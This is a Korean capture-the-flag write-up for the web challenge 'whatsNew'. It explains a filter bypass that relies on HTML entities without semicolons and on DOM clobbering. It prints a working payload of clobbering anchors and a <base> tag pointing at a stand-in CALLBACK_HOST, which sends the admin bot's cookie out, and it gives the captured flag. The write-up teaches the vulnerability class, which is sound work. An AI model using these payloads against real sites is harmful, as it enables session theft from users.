# whatsNew

> 스포일러: 이 문서는 문제의 분석 과정과 최종 풀이를 포함합니다.

## 개요

| 항목 | 내용 |
|---|---|
| 상태 | solved |
| 대회·플랫폼 | K17 CTF 2026 / noCTF |
| 분야 | web |
| 난이도 | hard |
| 배점 | 동적 배점(제공된 문제 화면에서 168점) |
| Flag 형식 | `K17{...}` |

게시물 `description`에는 저장형 HTML 삽입이 가능하지만 강한 문자열 블랙리스트와 200자 제한이 적용된다. 세 카테고리의 최신 게시물에 페이로드를 나누고, 세미콜론 없는 숫자 문자 참조와 DOM clobbering을 결합하면 관리자 페이지의 설정 객체를 공격자가 만든 `HTMLCollection`으로 바꿀 수 있다. 이후 `<base>`로 URL 해석 기준을 바꾸어 관리자 봇의 쿠키를 회수한다.

## 환경 및 초기 분석

공식 입력은 [handout.zip](../challenge/handout.zip)이며 SHA-256은 `583B3EFDF428E5E93157EB1313EB08F44CF0DBFF21CF0125E42110FFC2E66C8C`이다. 압축 파일의 Node.js/Express 소스는 [challenge/whatsNew](../challenge/whatsNew)에 보존했다. 공용 Python 환경은 [requirements.txt](../../../requirements.txt)로 복원하며, 최종 solver는 Python 표준 라이브러리와 시스템 `ssh`를 사용한다.

`POST /category/:slug/new`는 `description`만 `decodeHtml()`과 `isSuspicious()`에 전달한다. 반면 각 카테고리의 `renderPost()`는 이 값을 `raw()`로 HTML에 삽입한다. 인증 없는 `GET /admin/preview`는 HTTP 403이었고, `POST /report`가 인증 쿠키를 가진 관리자 봇에게 `/admin/preview` 방문을 요청한다.

로컬 동작 확인에는 Python `3.12.10`, Node.js `24.20.0`, Chrome `153.0.8010.36`, OpenSSH `9.5p2`를 사용했다. 구체적인 요청 상태와 브라우저 관찰값은 [evidence.md](../analysis/evidence.md)에 정리했다.

## 핵심 분석

`decodeHtml()`의 정규식은 끝에 `;`가 있는 HTML 문자 참조만 해석한다. 따라서 `w&#104atsNew`는 서버 필터에서는 `whatsNew`가 아니지만, 브라우저의 HTML 파서는 `&#104`를 `h`로 해석해 최종 `id`를 `whatsNew`로 만든다. 같은 방식으로 `m&#111de`, `p&#97nel`, `&#35latest-posts` 같은 금지 문자열을 브라우저에서만 복원할 수 있다.

관리자 페이지에는 다음 여섯 개의 `<a>`가 합쳐져 렌더링된다. 모두 브라우저에서 `id=whatsNew`가 되고, 각각의 `name`은 `mode`, `category`, `panel`, `label`, `autoReview`, `next`가 된다. 중복 ID에 대한 Window named access 때문에 `window.whatsNew`는 여섯 원소의 `HTMLCollection`이 되며, 각 `name`은 collection의 named property로 노출된다.

```html
<a id=w&#104atsNew name=m&#111de href=x></a>
<a id=w&#104atsNew name=c&#97tegory href=x></a>
<a id=w&#104atsNew name=p&#97nel href=&#35latest-posts></a>
<a id=w&#104atsNew name=l&#97bel href=x></a>
<a id=w&#104atsNew name=a&#117toReview href=1></a>
<a id=w&#104atsNew name=n&#101xt href=/&#97dmin/x></a>
```

`updates.js`의 검사 결과 `panel`은 `#latest-posts`, `autoReview`는 `1`, `next.getAttribute('href')`는 `/admin/x`가 된다. 세 번째 게시물의 `<base href=&#47/CALLBACK_HOST/>`는 브라우저에서 `//CALLBACK_HOST/`로 해석된다. 따라서 raw `href`는 `/admin/`으로 시작한다는 검사를 통과하면서 `next.href`는 callback origin의 절대 URL이 된다. 마지막으로 스크립트가 `document.cookie`를 `cookie` query parameter에 넣고 그 URL로 이동한다.

각 description의 길이는 각각 150자, 148자, callback host에 따른 짧은 base payload이므로 200자 제한도 통과한다. [poc.html](../analysis/poc.html)에서 수정하지 않은 `updates.js`로 동일한 navigation을 확인했다.

## 풀이 및 재현

[solve.py](../solve.py)는 `instance.json`에서 challenge URL과 SSH tunnel endpoint를 읽는다. 로컬 HTTP callback 서버와 일회성 reverse tunnel을 시작하고, `tech`, `travel`, `food`에 위 세 조각을 저장한 뒤 `/report`를 호출한다. callback의 `cookie` 값에서 `K17{...}`를 추출하며, 진행 로그 없이 flag byte만 stdout에 기록한다.

Competition의 `.venv`를 활성화하고 challenge root에서 실행한다.

```bash
python -m pip install -r ../../requirements.txt
python -m pip check
python solve.py
```

원격 인스턴스가 재생성되면 [instance.json](../instance.json)의 `main.url`만 새 주소로 바꾼다.

## 결과

실제 원격 관리자 봇은 `token=K17%7BG4dg3t_D0M_Cl0663r1nggg%21%7D`를 callback으로 전송했다. `python solve.py`는 exit code 0, 빈 stderr, trailing newline 없는 다음 stdout을 생성했으며 `flag` 파일과 byte 단위로 일치했다.

```text
K17{G4dg3t_D0M_Cl0663r1nggg!}
```

## 정리 및 회고

문자열 블랙리스트가 서버와 브라우저의 HTML entity 해석 차이를 반영하지 않으면 금지 토큰이 파싱 후 복원될 수 있다. 또한 named DOM property를 설정 객체로 사용하는 코드는 실행 가능한 JavaScript 없이도 DOM clobbering의 영향을 받는다. raw attribute와 resolved URL을 서로 다른 단계에서 검사하는 경우 `<base>`가 두 표현 사이의 신뢰 경계를 깨뜨릴 수 있다.

## 참고 자료

- [categoryRoutes.js](../challenge/whatsNew/src/routes/categoryRoutes.js): 입력 처리와 필터 적용 위치.
- [filter.js](../challenge/whatsNew/src/filter.js): entity decoder와 블랙리스트 동작.
- [updates.js](../challenge/whatsNew/public/static/updates.js): DOM 설정 소비와 쿠키 포함 navigation.
- [adminRoutes.js](../challenge/whatsNew/src/routes/adminRoutes.js): 관리자 봇 인증 경계.
- 외부 write-up은 사용하지 않았다.

